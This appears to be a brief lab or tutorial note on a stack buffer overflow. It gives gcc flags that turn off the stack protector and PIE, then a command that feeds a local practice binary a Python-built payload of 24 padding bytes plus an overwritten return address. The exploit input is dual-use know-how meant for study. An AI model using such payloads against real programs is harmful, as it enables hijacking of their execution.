Compile with gcc -fno-stack-protector -no-pie

Then run:
❯ ./bins/buffer_overflow_ret_injection $(python3 -c "import sys; sys.stdout.buffer.write(b'A'\*24 + b'\x56\x11\x40')")
